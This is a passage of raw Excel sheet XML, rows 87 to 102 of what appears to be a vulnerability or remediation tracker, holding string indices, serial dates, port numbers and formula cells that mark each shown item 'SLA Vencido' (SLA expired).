    <row r="87" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A87" s="5">
        <v>86</v>
      </c>
      <c r="B87" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C87" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D87" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E87" s="4" t="s">
        <v>334</v>
      </c>
      <c r="F87" s="4"/>
      <c r="G87" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H87" s="4"/>
      <c r="I87" s="4"/>
      <c r="J87" s="4" t="s">
        <v>335</v>
      </c>
      <c r="K87" s="4" t="s">
        <v>281</v>
      </c>
      <c r="L87" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M87" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N87" s="4"/>
      <c r="O87" s="6"/>
      <c r="P87" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q87" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R87" s="4"/>
      <c r="S87" s="22"/>
      <c r="T87" s="8">
        <v>43816</v>
      </c>
      <c r="U87" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V87" s="8">
        <f t="shared" si="4"/>
        <v>43906</v>
      </c>
      <c r="W87" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X87" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y87" s="12" t="s">
        <v>206</v>
      </c>
      <c r="Z87" s="12" t="s">
        <v>336</v>
      </c>
      <c r="AA87" s="8">
        <v>44260</v>
      </c>
      <c r="AB87" s="9" t="s">
        <v>337</v>
      </c>
      <c r="AC87" s="9" t="s">
        <v>338</v>
      </c>
      <c r="AD87" s="36"/>
      <c r="AE87" s="8">
        <v>44148</v>
      </c>
      <c r="AF87" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG87" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="88" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A88" s="5">
        <v>87</v>
      </c>
      <c r="B88" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C88" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D88" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E88" s="4" t="s">
        <v>339</v>
      </c>
      <c r="F88" s="4"/>
      <c r="G88" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H88" s="4"/>
      <c r="I88" s="4"/>
      <c r="J88" s="4" t="s">
        <v>340</v>
      </c>
      <c r="K88" s="4" t="s">
        <v>341</v>
      </c>
      <c r="L88" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M88" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N88" s="4"/>
      <c r="O88" s="6"/>
      <c r="P88" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q88" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R88" s="4">
        <v>443</v>
      </c>
      <c r="S88" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T88" s="8">
        <v>43816</v>
      </c>
      <c r="U88" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V88" s="8">
        <f t="shared" si="4"/>
        <v>43906</v>
      </c>
      <c r="W88" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X88" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y88" s="12" t="s">
        <v>342</v>
      </c>
      <c r="Z88" s="12" t="s">
        <v>318</v>
      </c>
      <c r="AA88" s="8">
        <v>44113</v>
      </c>
      <c r="AB88" s="9" t="s">
        <v>343</v>
      </c>
      <c r="AC88" s="9" t="s">
        <v>344</v>
      </c>
      <c r="AD88" s="36"/>
      <c r="AE88" s="8">
        <v>44119</v>
      </c>
      <c r="AF88" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG88" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="89" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A89" s="5">
        <v>88</v>
      </c>
      <c r="B89" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C89" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D89" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E89" s="4"/>
      <c r="F89" s="4"/>
      <c r="G89" s="4" t="s">
        <v>325</v>
      </c>
      <c r="H89" s="4"/>
      <c r="I89" s="4"/>
      <c r="J89" s="4" t="s">
        <v>345</v>
      </c>
      <c r="K89" s="4" t="s">
        <v>346</v>
      </c>
      <c r="L89" s="5" t="s">
        <v>325</v>
      </c>
      <c r="M89" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N89" s="4"/>
      <c r="O89" s="6"/>
      <c r="P89" s="6"/>
      <c r="Q89" s="6"/>
      <c r="R89" s="4"/>
      <c r="S89" s="22"/>
      <c r="T89" s="4"/>
      <c r="U89" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>46209</v>
      </c>
      <c r="V89" s="8">
        <f t="shared" si="4"/>
        <v>120</v>
      </c>
      <c r="W89" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X89" s="11"/>
      <c r="Y89" s="11"/>
      <c r="Z89" s="11"/>
      <c r="AA89" s="8" t="s">
        <v>325</v>
      </c>
      <c r="AB89" s="9" t="s">
        <v>347</v>
      </c>
      <c r="AC89" s="9" t="s">
        <v>348</v>
      </c>
      <c r="AD89" s="36"/>
      <c r="AE89" s="4"/>
      <c r="AF89" s="9" t="s">
        <v>329</v>
      </c>
      <c r="AG89" s="27"/>
    </row>
    <row r="90" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A90" s="5">
        <v>89</v>
      </c>
      <c r="B90" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C90" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D90" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E90" s="4" t="s">
        <v>349</v>
      </c>
      <c r="F90" s="4"/>
      <c r="G90" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H90" s="4"/>
      <c r="I90" s="4"/>
      <c r="J90" s="4" t="s">
        <v>350</v>
      </c>
      <c r="K90" s="4" t="s">
        <v>351</v>
      </c>
      <c r="L90" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M90" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N90" s="4"/>
      <c r="O90" s="6"/>
      <c r="P90" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q90" s="10" t="s">
        <v>44</v>
      </c>
      <c r="R90" s="4">
        <v>443</v>
      </c>
      <c r="S90" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T90" s="8">
        <v>43816</v>
      </c>
      <c r="U90" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V90" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W90" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X90" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y90" s="30" t="s">
        <v>177</v>
      </c>
      <c r="Z90" s="30" t="s">
        <v>177</v>
      </c>
      <c r="AA90" s="8">
        <v>44025</v>
      </c>
      <c r="AB90" s="9" t="s">
        <v>352</v>
      </c>
      <c r="AC90" s="9" t="s">
        <v>353</v>
      </c>
      <c r="AD90" s="32" t="s">
        <v>354</v>
      </c>
      <c r="AE90" s="27">
        <v>44012</v>
      </c>
      <c r="AF90" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG90" s="27"/>
    </row>
    <row r="91" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A91" s="5">
        <v>90</v>
      </c>
      <c r="B91" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C91" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D91" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E91" s="4"/>
      <c r="F91" s="4"/>
      <c r="G91" s="4" t="s">
        <v>244</v>
      </c>
      <c r="H91" s="4"/>
      <c r="I91" s="4"/>
      <c r="J91" s="4" t="s">
        <v>350</v>
      </c>
      <c r="K91" s="4" t="s">
        <v>351</v>
      </c>
      <c r="L91" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M91" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N91" s="4"/>
      <c r="O91" s="6"/>
      <c r="P91" s="6" t="s">
        <v>247</v>
      </c>
      <c r="Q91" s="6"/>
      <c r="R91" s="4">
        <v>443</v>
      </c>
      <c r="S91" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T91" s="8">
        <v>43812</v>
      </c>
      <c r="U91" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V91" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W91" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X91" s="11"/>
      <c r="Y91" s="11"/>
      <c r="Z91" s="11"/>
      <c r="AA91" s="8">
        <v>43969</v>
      </c>
      <c r="AB91" s="9" t="s">
        <v>355</v>
      </c>
      <c r="AC91" s="9" t="s">
        <v>356</v>
      </c>
      <c r="AD91" s="36"/>
      <c r="AE91" s="4"/>
      <c r="AF91" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG91" s="27"/>
    </row>
    <row r="92" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A92" s="5">
        <v>91</v>
      </c>
      <c r="B92" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C92" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D92" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E92" s="4"/>
      <c r="F92" s="4"/>
      <c r="G92" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H92" s="4"/>
      <c r="I92" s="4"/>
      <c r="J92" s="4" t="s">
        <v>350</v>
      </c>
      <c r="K92" s="4" t="s">
        <v>351</v>
      </c>
      <c r="L92" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M92" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N92" s="4"/>
      <c r="O92" s="6"/>
      <c r="P92" s="10">
        <v>94188208248</v>
      </c>
      <c r="Q92" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R92" s="4">
        <v>443</v>
      </c>
      <c r="S92" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T92" s="8">
        <v>43816</v>
      </c>
      <c r="U92" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V92" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W92" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X92" s="11"/>
      <c r="Y92" s="11"/>
      <c r="Z92" s="11"/>
      <c r="AA92" s="8">
        <v>43969</v>
      </c>
      <c r="AB92" s="9" t="s">
        <v>355</v>
      </c>
      <c r="AC92" s="9" t="s">
        <v>356</v>
      </c>
      <c r="AD92" s="36"/>
      <c r="AE92" s="4"/>
      <c r="AF92" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG92" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="93" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A93" s="5">
        <v>92</v>
      </c>
      <c r="B93" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C93" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D93" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E93" s="4"/>
      <c r="F93" s="4"/>
      <c r="G93" s="4" t="s">
        <v>244</v>
      </c>
      <c r="H93" s="4"/>
      <c r="I93" s="4"/>
      <c r="J93" s="4" t="s">
        <v>350</v>
      </c>
      <c r="K93" s="4" t="s">
        <v>351</v>
      </c>
      <c r="L93" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M93" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N93" s="4"/>
      <c r="O93" s="6"/>
      <c r="P93" s="6" t="s">
        <v>250</v>
      </c>
      <c r="Q93" s="6"/>
      <c r="R93" s="4">
        <v>443</v>
      </c>
      <c r="S93" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T93" s="8">
        <v>43812</v>
      </c>
      <c r="U93" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2397</v>
      </c>
      <c r="V93" s="8">
        <f t="shared" si="4"/>
        <v>43932</v>
      </c>
      <c r="W93" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X93" s="11"/>
      <c r="Y93" s="11"/>
      <c r="Z93" s="11"/>
      <c r="AA93" s="8">
        <v>43969</v>
      </c>
      <c r="AB93" s="9" t="s">
        <v>355</v>
      </c>
      <c r="AC93" s="9" t="s">
        <v>356</v>
      </c>
      <c r="AD93" s="36"/>
      <c r="AE93" s="4"/>
      <c r="AF93" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG93" s="27"/>
    </row>
    <row r="94" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A94" s="5">
        <v>93</v>
      </c>
      <c r="B94" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C94" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D94" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E94" s="4"/>
      <c r="F94" s="4"/>
      <c r="G94" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H94" s="4"/>
      <c r="I94" s="4"/>
      <c r="J94" s="4" t="s">
        <v>357</v>
      </c>
      <c r="K94" s="4" t="s">
        <v>304</v>
      </c>
      <c r="L94" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M94" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N94" s="4"/>
      <c r="O94" s="6"/>
      <c r="P94" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q94" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R94" s="4">
        <v>443</v>
      </c>
      <c r="S94" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T94" s="8">
        <v>43816</v>
      </c>
      <c r="U94" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V94" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W94" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X94" s="12"/>
      <c r="Y94" s="12"/>
      <c r="Z94" s="12"/>
      <c r="AA94" s="8">
        <v>44069</v>
      </c>
      <c r="AB94" s="9" t="s">
        <v>358</v>
      </c>
      <c r="AC94" s="9" t="s">
        <v>359</v>
      </c>
      <c r="AD94" s="36"/>
      <c r="AE94" s="4"/>
      <c r="AF94" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG94" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="95" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A95" s="5">
        <v>94</v>
      </c>
      <c r="B95" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C95" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D95" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E95" s="4" t="s">
        <v>360</v>
      </c>
      <c r="F95" s="4"/>
      <c r="G95" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H95" s="4"/>
      <c r="I95" s="4"/>
      <c r="J95" s="4" t="s">
        <v>361</v>
      </c>
      <c r="K95" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L95" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M95" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N95" s="4"/>
      <c r="O95" s="6"/>
      <c r="P95" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q95" s="6" t="s">
        <v>44</v>
      </c>
      <c r="R95" s="4">
        <v>443</v>
      </c>
      <c r="S95" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T95" s="8">
        <v>43816</v>
      </c>
      <c r="U95" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V95" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W95" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X95" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y95" s="30" t="s">
        <v>177</v>
      </c>
      <c r="Z95" s="30" t="s">
        <v>177</v>
      </c>
      <c r="AA95" s="8">
        <v>44025</v>
      </c>
      <c r="AB95" s="9" t="s">
        <v>362</v>
      </c>
      <c r="AC95" s="9" t="s">
        <v>363</v>
      </c>
      <c r="AD95" s="36" t="s">
        <v>364</v>
      </c>
      <c r="AE95" s="27">
        <v>44012</v>
      </c>
      <c r="AF95" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG95" s="27"/>
    </row>
    <row r="96" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A96" s="5">
        <v>95</v>
      </c>
      <c r="B96" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C96" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D96" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E96" s="4"/>
      <c r="F96" s="4"/>
      <c r="G96" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H96" s="4"/>
      <c r="I96" s="4"/>
      <c r="J96" s="4" t="s">
        <v>361</v>
      </c>
      <c r="K96" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L96" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M96" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N96" s="4"/>
      <c r="O96" s="6"/>
      <c r="P96" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q96" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R96" s="4">
        <v>80</v>
      </c>
      <c r="S96" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T96" s="8">
        <v>43816</v>
      </c>
      <c r="U96" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V96" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W96" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X96" s="12"/>
      <c r="Y96" s="12"/>
      <c r="Z96" s="12"/>
      <c r="AA96" s="8">
        <v>43969</v>
      </c>
      <c r="AB96" s="9" t="s">
        <v>365</v>
      </c>
      <c r="AC96" s="9" t="s">
        <v>366</v>
      </c>
      <c r="AD96" s="36"/>
      <c r="AE96" s="4"/>
      <c r="AF96" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG96" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="97" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A97" s="5">
        <v>96</v>
      </c>
      <c r="B97" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C97" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D97" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E97" s="4"/>
      <c r="F97" s="4"/>
      <c r="G97" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H97" s="4"/>
      <c r="I97" s="4"/>
      <c r="J97" s="4" t="s">
        <v>361</v>
      </c>
      <c r="K97" s="4" t="s">
        <v>267</v>
      </c>
      <c r="L97" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M97" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N97" s="4"/>
      <c r="O97" s="6"/>
      <c r="P97" s="6"/>
      <c r="Q97" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R97" s="4">
        <v>443</v>
      </c>
      <c r="S97" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T97" s="8">
        <v>43816</v>
      </c>
      <c r="U97" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V97" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W97" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X97" s="11"/>
      <c r="Y97" s="11"/>
      <c r="Z97" s="11"/>
      <c r="AA97" s="8">
        <v>43969</v>
      </c>
      <c r="AB97" s="9" t="s">
        <v>365</v>
      </c>
      <c r="AC97" s="9" t="s">
        <v>366</v>
      </c>
      <c r="AD97" s="36"/>
      <c r="AE97" s="4"/>
      <c r="AF97" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG97" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="98" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A98" s="5">
        <v>97</v>
      </c>
      <c r="B98" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C98" s="5" t="s">
        <v>242</v>
      </c>
      <c r="D98" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E98" s="4"/>
      <c r="F98" s="4"/>
      <c r="G98" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H98" s="4"/>
      <c r="I98" s="4"/>
      <c r="J98" s="4" t="s">
        <v>367</v>
      </c>
      <c r="K98" s="4" t="s">
        <v>368</v>
      </c>
      <c r="L98" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M98" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N98" s="4"/>
      <c r="O98" s="6"/>
      <c r="P98" s="6"/>
      <c r="Q98" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R98" s="4">
        <v>443</v>
      </c>
      <c r="S98" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T98" s="8">
        <v>43816</v>
      </c>
      <c r="U98" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2393</v>
      </c>
      <c r="V98" s="8">
        <f t="shared" si="4"/>
        <v>43936</v>
      </c>
      <c r="W98" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X98" s="11"/>
      <c r="Y98" s="11"/>
      <c r="Z98" s="11"/>
      <c r="AA98" s="8">
        <v>43969</v>
      </c>
      <c r="AB98" s="9" t="s">
        <v>369</v>
      </c>
      <c r="AC98" s="9" t="s">
        <v>370</v>
      </c>
      <c r="AD98" s="36"/>
      <c r="AE98" s="4"/>
      <c r="AF98" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG98" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="99" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A99" s="5">
        <v>98</v>
      </c>
      <c r="B99" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C99" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D99" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E99" s="4"/>
      <c r="F99" s="4"/>
      <c r="G99" s="6" t="s">
        <v>372</v>
      </c>
      <c r="H99" s="4" t="s">
        <v>373</v>
      </c>
      <c r="I99" s="4"/>
      <c r="J99" s="4" t="s">
        <v>374</v>
      </c>
      <c r="K99" s="4"/>
      <c r="L99" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M99" s="5" t="s">
        <v>42</v>
      </c>
      <c r="N99" s="5" t="s">
        <v>229</v>
      </c>
      <c r="O99" s="6" t="s">
        <v>375</v>
      </c>
      <c r="P99" s="6" t="s">
        <v>376</v>
      </c>
      <c r="Q99" s="6" t="s">
        <v>372</v>
      </c>
      <c r="R99" s="4"/>
      <c r="S99" s="22"/>
      <c r="T99" s="8">
        <v>43866</v>
      </c>
      <c r="U99" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2343</v>
      </c>
      <c r="V99" s="8">
        <f t="shared" si="4"/>
        <v>43876</v>
      </c>
      <c r="W99" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X99" s="11"/>
      <c r="Y99" s="11"/>
      <c r="Z99" s="11"/>
      <c r="AA99" s="8">
        <v>43952</v>
      </c>
      <c r="AB99" s="9"/>
      <c r="AC99" s="9" t="s">
        <v>377</v>
      </c>
      <c r="AD99" s="32" t="s">
        <v>378</v>
      </c>
      <c r="AE99" s="9"/>
      <c r="AF99" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG99" s="27"/>
    </row>
    <row r="100" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A100" s="5">
        <v>99</v>
      </c>
      <c r="B100" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C100" s="5" t="s">
        <v>379</v>
      </c>
      <c r="D100" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E100" s="4"/>
      <c r="F100" s="4"/>
      <c r="G100" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H100" s="4" t="s">
        <v>380</v>
      </c>
      <c r="I100" s="4"/>
      <c r="J100" s="4" t="s">
        <v>381</v>
      </c>
      <c r="K100" s="4"/>
      <c r="L100" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M100" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N100" s="5" t="s">
        <v>229</v>
      </c>
      <c r="O100" s="6"/>
      <c r="P100" s="6" t="s">
        <v>382</v>
      </c>
      <c r="Q100" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R100" s="4"/>
      <c r="S100" s="22"/>
      <c r="T100" s="8">
        <v>43896</v>
      </c>
      <c r="U100" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2313</v>
      </c>
      <c r="V100" s="8">
        <f t="shared" si="4"/>
        <v>43986</v>
      </c>
      <c r="W100" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X100" s="11"/>
      <c r="Y100" s="11"/>
      <c r="Z100" s="11"/>
      <c r="AA100" s="8">
        <v>43891</v>
      </c>
      <c r="AB100" s="9" t="s">
        <v>383</v>
      </c>
      <c r="AC100" s="9" t="s">
        <v>384</v>
      </c>
      <c r="AD100" s="32" t="s">
        <v>385</v>
      </c>
      <c r="AE100" s="9"/>
      <c r="AF100" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG100" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="101" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A101" s="5">
        <v>100</v>
      </c>
      <c r="B101" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C101" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D101" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E101" s="4"/>
      <c r="F101" s="4"/>
      <c r="G101" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H101" s="4" t="s">
        <v>386</v>
      </c>
      <c r="I101" s="4"/>
      <c r="J101" s="4" t="s">
        <v>387</v>
      </c>
      <c r="K101" s="4"/>
      <c r="L101" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M101" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N101" s="5" t="s">
        <v>229</v>
      </c>
      <c r="O101" s="6" t="s">
        <v>388</v>
      </c>
      <c r="P101" s="6" t="s">
        <v>175</v>
      </c>
      <c r="Q101" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R101" s="4">
        <v>443</v>
      </c>
      <c r="S101" s="22" t="s">
        <v>230</v>
      </c>
      <c r="T101" s="8">
        <v>43921</v>
      </c>
      <c r="U101" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2288</v>
      </c>
      <c r="V101" s="8">
        <f t="shared" si="4"/>
        <v>44011</v>
      </c>
      <c r="W101" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X101" s="11"/>
      <c r="Y101" s="11"/>
      <c r="Z101" s="11"/>
      <c r="AA101" s="8">
        <v>44113</v>
      </c>
      <c r="AB101" s="9"/>
      <c r="AC101" s="9" t="s">
        <v>389</v>
      </c>
      <c r="AD101" s="32" t="s">
        <v>390</v>
      </c>
      <c r="AE101" s="8">
        <v>44119</v>
      </c>
      <c r="AF101" s="27" t="s">
        <v>391</v>
      </c>
      <c r="AG101" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="102" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A102" s="5">
        <v>101</v>
      </c>
      <c r="B102" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C102" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D102" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E102" s="4" t="s">
        <v>392</v>
      </c>
      <c r="F102" s="4" t="s">
        <v>393</v>
      </c>
      <c r="G102" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H102" s="9" t="s">
        <v>394</v>
      </c>
      <c r="I102" s="4" t="s">
        <v>395</v>
      </c>
      <c r="J102" s="4" t="s">
        <v>396</v>
      </c>
      <c r="K102" s="4"/>
      <c r="L102" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M102" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N102" s="5">
        <v>3.7</v>
      </c>
      <c r="O102" s="14" t="s">
        <v>397</v>
      </c>
      <c r="P102" s="6" t="s">
        <v>382</v>
      </c>
      <c r="Q102" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R102" s="4">
        <v>443</v>
      </c>
      <c r="S102" s="22"/>
      <c r="T102" s="8">
        <v>43984</v>
      </c>
      <c r="U102" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>2225</v>
      </c>
      <c r="V102" s="8">
        <f t="shared" si="4"/>
        <v>44104</v>
      </c>
      <c r="W102" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X102" s="12" t="s">
        <v>22</v>
      </c>
